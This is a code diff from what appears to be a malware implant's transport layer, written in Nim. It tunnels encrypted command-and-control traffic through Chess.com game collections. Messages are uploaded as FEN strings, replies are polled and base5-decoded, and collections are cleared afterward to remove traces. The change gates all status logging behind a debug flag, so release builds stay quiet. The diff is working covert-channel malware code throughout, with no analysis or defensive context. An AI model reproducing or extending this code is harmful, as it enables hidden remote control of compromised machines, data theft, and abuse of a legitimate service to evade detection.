@@ -274,18 +274,18 @@ proc listGames(t: Transport; collectionId: string): seq[tuple[id: string, fen: s
     t.client.headers = t.itemHeaders
     let resp = t.client.get(url)
     if not resp.code.is2xx:
-      stderr.writeLine("[!] chess list HTTP " & $resp.code)
+      when defined(debug): stderr.writeLine("[!] chess list HTTP " & $resp.code)
       return @[]
     result = parseGamesJson(resp.body, mergeSkipIds())
   except Exception as e:
-    stderr.writeLine("[!] chess list error: " & e.msg)
+    when defined(debug): stderr.writeLine("[!] chess list error: " & e.msg)
 
 proc clearCollection(t: Transport; collectionId: string) =
   let games = t.listGames(collectionId)
   if games.len == 0:
-    stderr.writeLine("[*] chess clear " & collectionId[0 .. min(7, collectionId.high)] & "… already empty")
+    when defined(debug): stderr.writeLine("[*] chess clear " & collectionId[0 .. min(7, collectionId.high)] & "… already empty")
     return
-  stderr.writeLine("[*] chess clear " & collectionId[0 .. min(7, collectionId.high)] & "… deleting " & $games.len & " items")
+  when defined(debug): stderr.writeLine("[*] chess clear " & collectionId[0 .. min(7, collectionId.high)] & "… deleting " & $games.len & " items")
   var i = 0
   while i < games.len:
     var ids = newJArray()
@@ -298,11 +298,11 @@ proc clearCollection(t: Transport; collectionId: string) =
       t.client.headers = t.jsonHeaders
       let resp = t.client.post(url, body = $payload)
       if not resp.code.is2xx():
-        stderr.writeLine("[!] chess clear HTTP " & $resp.code & " for " & collectionId[0 .. min(7, collectionId.high)] & "…")
+        when defined(debug): stderr.writeLine("[!] chess clear HTTP " & $resp.code & " for " & collectionId[0 .. min(7, collectionId.high)] & "…")
       else:
-        stderr.writeLine("[+] chess clear OK (" & $resp.code & ")")
+        when defined(debug): stderr.writeLine("[+] chess clear OK (" & $resp.code & ")")
     except Exception as e:
-      stderr.writeLine("[!] chess clear: " & e.msg)
+      when defined(debug): stderr.writeLine("[!] chess clear: " & e.msg)
     i = lim
 
 proc uploadGames(t: Transport; collectionId: string; fens: seq[string]) =
@@ -317,7 +317,7 @@ proc uploadGames(t: Transport; collectionId: string; fens: seq[string]) =
     t.client.headers = t.jsonHeaders
     discard t.client.post(url, body = $payload)
   except Exception as e:
-    stderr.writeLine("[!] chess upload batch: " & e.msg)
+    when defined(debug): stderr.writeLine("[!] chess upload batch: " & e.msg)
 
 proc uploadPayload(t: Transport; collectionId: string; payload: seq[byte]) =
   sleepThrottle()
@@ -341,7 +341,7 @@ proc uploadPayload(t: Transport; collectionId: string; payload: seq[byte]) =
 proc waitDownload(t: Transport; collectionId: string): seq[byte] =
   while true:
     let games = t.listGames(collectionId)
-    stderr.writeLine("[*] chess waitDownload: " & $games.len & " items in " &
+    when defined(debug): stderr.writeLine("[*] chess waitDownload: " & $games.len & " items in " &
       collectionId[0 .. min(7, collectionId.high)] & "…" &
       (if games.len > 0: " first=" & games[0].fen[0 .. min(15, games[0].fen.high)] else: ""))
     if games.len >= 1 and games[0].fen == MarkerFen:
@@ -353,7 +353,7 @@ proc waitDownload(t: Transport; collectionId: string): seq[byte] =
         if not c.isDigit():
           b5.add(c)
       result = decodeBase5(b5)
-      stderr.writeLine("[*] chess waitDownload: decoded " & $result.len & " bytes, clearing collection")
+      when defined(debug): stderr.writeLine("[*] chess waitDownload: decoded " & $result.len & " bytes, clearing collection")
       t.clearCollection(collectionId)
       return
     sleep(3000)
@@ -366,20 +366,20 @@ proc strToUtf8(s: string): seq[byte] =
 proc post*(t: Transport; currentUUID: string, aesKey: seq[byte], jsonBody: string): string =
   let msg = buildMessage(currentUUID, aesKey, jsonBody)
   let payloadUtf8 = strToUtf8(msg)
-  stderr.writeLine("[*] Chess.com upload → agent collection (" & $payloadUtf8.len & " B)")
+  when defined(debug): stderr.writeLine("[*] Chess.com upload → agent collection (" & $payloadUtf8.len & " B)")
   t.uploadPayload(ChessAgentUploadCollection, payloadUtf8)
-  stderr.writeLine("[*] Chess.com pre-clearing reply collection to remove stale data")
+  when defined(debug): stderr.writeLine("[*] Chess.com pre-clearing reply collection to remove stale data")
   t.clearCollection(ChessServerReplyCollection)
   let downloaded = t.waitDownload(ChessServerReplyCollection)
   if downloaded.len == 0:
-    stderr.writeLine("[!] Chess empty download")
+    when defined(debug): stderr.writeLine("[!] Chess empty download")
     return ""
   let b64txt = fromBytes(downloaded)
   try:
     let rawResp = toBytes(base64.decode(b64txt))
     result = parseResponse(rawResp, aesKey)
     if result.len > 0:
-      stderr.writeLine("[+] Chess response OK (" & $result.len & " B JSON)")
+      when defined(debug): stderr.writeLine("[+] Chess response OK (" & $result.len & " B JSON)")
   except Exception as e:
-    stderr.writeLine("[!] Chess parse: " & e.msg)
+    when defined(debug): stderr.writeLine("[!] Chess parse: " & e.msg)
     result = ""
